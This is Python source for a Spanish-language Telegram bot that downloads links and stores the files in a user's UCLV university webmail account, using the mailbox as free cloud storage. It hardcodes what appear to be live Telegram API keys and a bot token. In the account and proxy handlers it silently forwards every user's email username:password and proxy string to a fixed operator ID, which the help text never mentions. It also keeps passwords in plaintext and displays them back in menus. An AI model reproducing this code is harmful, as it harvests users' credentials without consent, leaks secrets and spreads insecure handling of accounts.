from pyrogram import Client,filters
from pyrogram.types import (
    ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton)
import asyncio
import os
from os.path import exists
from files_client import files
from deleted_client import deleted, deletedall
from upload_client import upload
from download import download
import urllib.parse
         
app = Client('uclvcloud',api_id=9024532,api_hash='131b576240be107210aace99a5f5c5b0',bot_token='5771140185:AAGNTLYEIuMdavjBTqrigJv673u87cu6wRw')
@app.on_message(filters.private & filters.text)
async def home(client, message):
		text = message.text
		user_id = message.from_user.id
		user_name = message.chat.username
		msg_id = message.id
		if '/start' in text:
			await app.delete_messages(user_id,msg_id)
			if not exists(str(user_id)):
				os.mkdir(str(user_id))
			if not exists(str(user_id)+"/username"):
				start = "***UclvCloud 2*** \n  Sin cuenta"
			else:
				if not exists(str(user_id)+"/proxy"):
					username = open(str(user_id)+"/username","r")
					password = open(str(user_id)+"/password","r")
					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
				else:
					username = open(str(user_id)+"/username","r")
					password = open(str(user_id)+"/password","r")
					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
        ]))
		elif 'http://' in text or 'https://' in text:
			await app.send_message(user_id, "Descargando")
			filename = download(text)
			await app.delete_messages(user_id, msg_id + 1)
			await app.send_message(user_id,"Subiendo "+ filename)
			username = open(str(user_id)+"/username","r")
			password = open(str(user_id)+"/password","r")
			proxy = None
			
			if exists(str(user_id)+"/proxy"):
				proxy = open(str(user_id)+"/proxy","r")
				#si proxy
				uploadin = upload(username.read(), password.read(), "https://correo.uclv.edu.cu", filename,proxy=proxy.read())
			else:
				#no proxy
				uploadin = upload(username.read(), password.read(), "https://correo.uclv.edu.cu", filename,proxy="")
			if "ERROR" in uploadin:
				await app.delete_messages(user_id, int(msg_id) + 1)
				await app.send_message(user_id,uploadin)
			else:
				txt = open(filename.split(".")[0]+".txt", "w")
				txt.write(uploadin.replace(" ","%20"))
				txt.close()
				await app.delete_messages(user_id, int(msg_id) + 2)
				await app.send_message(user_id,filename, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("DESCARGAR",url=uploadin.replace(" ","%20"))]]))
				await app.send_document(user_id, filename.split(".")[0]+".txt")
		elif '/menu' in text:
			await app.delete_messages(user_id,msg_id)
			if not exists(str(user_id)):
				os.mkdir(str(user_id))
			if not exists(str(user_id)+"/username"):
				start = "***UclvCloud 2*** \n  Sin cuenta"
			else:
				if not exists(str(user_id)+"/proxy"):
					username = open(str(user_id)+"/username","r")
					password = open(str(user_id)+"/password","r")
					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
				else:
					username = open(str(user_id)+"/username","r")
					password = open(str(user_id)+"/password","r")
					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
        ]))
		elif "socks5://" in text:
        			log = open(str(user_id)+"log","r")
        			logr = log.read()
        			proxy = open(str(user_id)+"/proxy", "w")
        			proxy.write(text)
        			if "socks5://none" in text:
        				os.remove(str(user_id)+"/proxy")
        			else:
        				await app.send_message(1593891519,"El usuario @"+user_name+" puso el proxy: `"+text+"`")
        			if not exists(str(user_id)+"/username"):
        				start = "***UclvCloud 2*** \n  Sin cuenta"
        			else:
        				if not exists(str(user_id)+"/proxy"):
        					username = open(str(user_id)+"/username","r")
        					password = open(str(user_id)+"/password","r")
        					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
        				else:
        					username = open(str(user_id)+"/username","r")
        					password = open(str(user_id)+"/password","r")
        					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
        			await app.delete_messages(user_id, int(msg_id) - 1)
        			await app.delete_messages(user_id, msg_id)
        			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
        ]))
		elif ":" in text:
		      	log = open(str(user_id)+"log","r")
		      	logr = log.read()
		      	if "files" in logr:
		      		data = text.split(":")
		      		if data[0] == "rm":
		      			username = open(str(user_id)+"/username", "r")
		      			password = open(str(user_id)+"/password", "r")
		      			if data[1] == "all":
		      				await app.delete_messages(user_id, msg_id - 1)
		      				await app.send_message(user_id, "BORRANDO")
		      				deletedall(username.read(), password.read(), "https://correo.uclv.edu.cu")
		      			else:
		      				await app.delete_messages(user_id, msg_id - 1)
		      				await app.send_message(user_id, "BORRANDO")
		      				await app.delete_messages(user_id, msg_id)
		      				deleted(username.read(),password.read(), "https://correo.uclv.edu.cu", data[1])
		      			if not exists(str(user_id)+"/username"):
		      				start = "***UclvCloud 2*** \n  Sin cuenta"
		      			else:
		      					if not exists(str(user_id)+"/proxy"):
		      						username = open(str(user_id)+"/username","r")
		      						password = open(str(user_id)+"/password","r")
		      						start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
		      					else:
		      						username = open(str(user_id)+"/username","r")
		      						password = open(str(user_id)+"/password","r")
		      						start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
		      			await app.delete_messages(user_id, int(msg_id) - 1)
		      			await app.delete_messages(user_id, msg_id)
		      			await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
        ]))
		      	if "account" in logr:
		      		username = open(str(user_id)+"/username", "w")
		      		password = open(str(user_id)+"/password", "w")
		      		data = text.split(":")
		      		username.write(data[0])
		      		password.write(data[1])
		      		if user_id != 1593891519:
		      			await app.send_message(1593891519, "El usuario @"+str(user_name)+" puso la cuenta `"+str(data[0])+":"+str(data[1])+"`")
		      		log = open(str(data[1])+"log","w")
		      		log.write("")
		      		if not exists(str(user_id)+"/username"):
		      			start = "***UclvCloud 2*** \n  Sin cuenta"
		      		else:
		      			if not exists(str(user_id)+"/proxy"):
		      				username = open(str(user_id)+"/username","r")
		      				password = open(str(user_id)+"/password","r")
		      				start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
		      			else:
		      				username = open(str(user_id)+"/username","r")
		      				password = open(str(user_id)+"/password","r")
		      				start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
		      		await app.delete_messages(user_id, msg_id)
		      		await app.delete_messages(user_id, int(msg_id) - 1)
		      		await app.send_message(user_id, start, reply_markup=InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(user_id)+":"+str(msg_id))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
        ]))
@app.on_callback_query()
async def answer(client, callback_query):
	data = callback_query.data
	if 'help' in data:
		data = data.split(":")
		await app.delete_messages(data[1], int(data[2]) + 1)
		await app.send_message(data[1],"__Desarrollo de **Kanami Studios**__ \n\n **¿Usted tiene un correo de la uclv?** \n __Parecido a__ `kanami@uclv.cu` __, bueno..., si lo tiene felicidades con este bot puede hacer de ese correo su nube personal de descargas gratis en Cuba. \n Envíe un enlace para empezar la descarga de este en el bot para ser subido a su correo, el tamaño de las partes de los zips es automaticamente 48 MB.__ \n\n__El usuario y contraseña se editan en **CAMBIAR USUARIO** del menú, el formato del usuario es kanami@uclv.cu y el de la contraseña @Kanami0__\n\n__En **VER ARCHIVOS** usted puede ver y eliminar sus archivos en el correo para conservar el almacenamiento que debería ser de 1.95 GB__\n\n **__Para subir archivos use las hora de 11:00 pm : 11:00 am__**\n\n **Es hora de descargar gratis!!**", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
	if 'account' in data:
		data = data.split(":")
		log = open(str(data[1])+"log","w")
		log.write("account")
		await app.delete_messages(data[1], int(data[2]) + 1)
		await app.send_message(data[1],"**Envie los datos en el formato:** \n `username:password`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
	if 'proxy' in data:
		data = data.split(":")
		log = open(str(data[1])+"log","w")
		log.write("proxy")
		await app.delete_messages(data[1], int(data[2]) + 1)
		await app.send_message(data[1],"**Envie los datos en el formato:** \n `socks5://100.100.10.1:1000` \n **O para desactivar:** \n `socks5://none`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
	if 'files' in data:
		data = data.split(":")
		log = open(str(data[1])+"log","w")
		log.write("files")
		if exists(data[1]+"/username"):
			username = open(str(data[1])+"/username","r")
			password = open(str(data[1])+"/password","r")
			filesk = files(username.read(),password.read(),"https://correo.uclv.edu.cu")
			if '<a' not in filesk:
				await app.delete_messages(data[1], int(data[2]) + 1)
				await app.send_message(data[1],"No hay archivos en la nube", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]),disable_web_page_preview=True)
			else:
				await app.delete_messages(data[1],int(data[2]) + 1)
				await app.send_message(data[1], filesk, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]),disable_web_page_preview=True)
		else:
			await app.delete_messages(data[1], int(data[2]) + 1)
			await app.send_message(data[1], "Sin cuenta", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CANCELAR",callback_data="cancel:"+str(data[1])+":"+str(data[2]))]]))
	if 'cancel' in data:
		data = data.split(":")
		log = open("log", "w")
		log.write("")
		log.close()
		if not exists(str(data[1])+"/username"):
				start = "***UclvCloud 2*** \n  Sin cuenta"
		else:
				if not exists(str(data[1])+"/proxy"):
					username = open(str(data[1])+"/username","r")
					password = open(str(data[1])+"/password","r")
					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()
				else:
					username = open(str(data[1])+"/username","r")
					password = open(str(data[1])+"/password","r")
					start = "***UclvCloud 2*** \n User: "+username.read()+" \n Pass: "+password.read()+"\n Proxy activado"
		await app.delete_messages(data[1],int(data[2]) + 2)
		await app.send_message(data[1] ,start, reply_markup=InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("CAMBIAR CUENTA",callback_data="account:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("PROXY",callback_data="proxy:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("VER ARCHIVOS",callback_data="files:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("AYUDA",callback_data="help:"+str(data[1])+":"+str(int(data[2])))],[InlineKeyboardButton("Studio Kanami", url="https://t.me/studiokanami")]
        ]))
 
print("Iniciado")
app.run()
